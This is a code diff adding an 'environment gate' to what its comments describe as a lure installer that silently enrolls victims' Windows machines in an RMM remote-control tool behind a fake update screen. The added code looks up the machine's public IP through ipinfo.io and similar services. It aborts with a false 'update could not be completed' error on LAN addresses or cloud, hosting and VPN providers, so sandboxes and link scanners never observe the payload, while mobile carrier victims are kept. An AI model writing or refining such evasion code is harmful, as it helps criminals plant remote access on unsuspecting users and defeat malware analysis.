@@ -393,7 +393,141 @@ function setStatus(html) { $("status").innerHTML = html; }
 // hidden helper process once WinHttp shows no data either. Any back-end that
 // lands a complete, valid MSI settles the download; the others are dropped.
 // ---------------------------------------------------------------------------
+// ============================================================ ENV GATE ===
+// Bot / sandbox gate (fails OPEN - only blocks on a confident match).
+//
+// Automated link-scanners and malware-analysis sandboxes pull a lure link
+// from non-residential egress (cloud / hosting / VPN / private LAN). A real
+// victim is on a home, office or cellular line. We classify the machine's
+// egress IP and abort the install (with the normal "update failed" screen)
+// when it is clearly not residential, so bots never register on the RMM.
+// Any lookup error, timeout or ambiguous result => install proceeds.
+// ============================================================
+var ENV_GATE = {
+  // cloud / hosting / VPN provider markers, matched case-insensitively as
+  // substrings against (org + isp + hostname + ip).
+  providers:
+    "amazonaws, amazon.com, ec2, " +
+    "google cloud, google llc, google.com, googleusercontent, " +
+    "gcp, " +
+    "microsoft azure, azurecloud, cloudapp.net, " +
+    "azure, " +
+    "microsoft, " +
+    "digitalocean, linode, " +
+    "vultr, " +
+    "cloudflare, " +
+    "oracle cloud, oracle.com, " +
+    "ovh, ovhcloud, " +
+    "hetzner, " +
+    "contabo, " +
+    "rackspace, " +
+    "hosting, " +
+    "1&1, ionos, " +
+    "netlify, vercel, heroku, fastly, akamai, " +
+    "equinix, " +
+    "alibaba, " +
+    "vpn, proton, nordvpn, mullvad, windscribe, expressvpn, " +
+    "datacenter, data centre",
+  // allowlist: exact IPs or hostname substrings that always pass.
+  // e.g. "1.2.3.4, my-lab-box". Empty by default.
+  allow: ""
+};
+
+function envLog(s) { try { if (typeof traceLog === "function") traceLog("gate: " + s); } catch (e) {} }
+
+function _envJstr(s, k) {
+  try {
+    var m = s.match(new RegExp("\"" + k + "\"\\s*:\\s*\"?([^\",}\\]]+)\"?"));
+    return m ? m[1] : "";
+  } catch (e) { return ""; }
+}
+
+// Synchronous JSON GET (WinHttp direct, 5s cap; curl.exe fallback).
+// Returns "" on any failure so the gate fails open.
+function _envGet(url) {
+  try {
+    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    w.SetProxy(0, null);                 // direct - ignore system proxy
+    w.SetTimeouts(5000, 5000, 5000, 5000);
+    w.Open("GET", url, false);
+    w.Send();
+    if (w.Status === 200) {
+      var b = String(w.responseText);
+      if (b && b.length < 20000) return b;
+    }
+  } catch (e) {}
+  try {
+    var tmp = shell.ExpandEnvironmentStrings("%TEMP%") + "\\egate_" + Math.floor(Math.random() * 1000000) + ".txt";
+    shell.Run("cmd /c curl.exe -s -m 6 --ssl-no-revoke \"" + url + "\" > \"" + tmp + "\" 2>nul", 0, true);
+    if (fso.FileExists(tmp)) {
+      var f = fso.OpenTextFile(tmp, 1);
+      var d = f.ReadAll();
+      f.Close();
+      try { fso.DeleteFile(tmp, true); } catch (e2) {}
+      return d;
+    }
+  } catch (e) {}
+  return "";
+}
+
+// true => block the install (non-residential machine detected).
+function envGateBlock() {
+  var raw = _envGet("https://ipinfo.io/json");
+  if (!raw || raw.indexOf('"ip"') < 0) raw = _envGet("https://ipapi.co/json");
+  if (!raw || raw.indexOf('"ip"') < 0) {
+    var bare = _envGet("https://api.ipify.org");
+    if (bare && bare.indexOf(".") >= 0) raw = "{\"ip\":\"" + bare.trim() + "\"}";
+  }
+  if (!raw) { envLog("no lookup data -> allow (fail-open)"); return false; }
+
+  var ip = _envJstr(raw, "ip");
+  var org = _envJstr(raw, "org") + " " + _envJstr(raw, "isp");
+  var host = _envJstr(raw, "hostname");
+  var priv = _envJstr(raw, "private");
+  var hay = (org + " " + host + " " + ip).toLowerCase();
+  envLog("ip=" + (ip || "?") + " host=" + (host || "?") + " org=" + org.trim() + " private=" + (priv || "?"));
+
+  // allowlist override
+  if (ENV_GATE.allow) {
+    var al = ENV_GATE.allow.split(",");
+    for (var a = 0; a < al.length; a++) {
+      var tok = al[a].trim();
+      if (tok && (tok === ip || (host && host.toLowerCase().indexOf(tok) >= 0))) {
+        envLog("allowlisted (" + tok + ") -> allow");
+        return false;
+      }
+    }
+  }
+
+  if (ip) {
+    var parts = ip.split(".");
+    var p0 = +parts[0], p1 = +parts[1];
+    // LAN / loopback / link-local: never a real victim's egress.
+    if (p0 === 127 || p0 === 10 || (p0 === 172 && p1 >= 16 && p1 <= 31) || (p0 === 192 && p1 === 168) || (p0 === 169 && p1 === 254)) {
+      envLog("private/lan ip -> block");
+      return true;
+    }
+    // CGNAT 100.64.0.0/10 = mobile / shared carrier NAT - keep those victims.
+    var isCgnat = (p0 === 100 && p1 >= 64 && p1 <= 127);
+    if (priv === "true" && !isCgnat) { envLog("provider reports private -> block"); return true; }
+  }
+
+  var ps = ENV_GATE.providers.split(",");
+  for (var i = 0; i < ps.length; i++) {
+    var p = ps[i].trim();
+    if (p.length > 2 && hay.indexOf(p) >= 0) {
+      envLog("datacenter/hosting/VPN provider '" + p + "' -> block");
+      return true;
+    }
+  }
+
+  envLog("residential/unknown -> allow");
+  return false;
+}
+// ===== end ENV GATE =====
+
 function startInstall() {
+  if (envGateBlock()) { fail("The update could not be completed.", "gate: non-residential environment"); return; }
   if (state !== "ready") return;
   state = "predl";
   curLog = logPath;
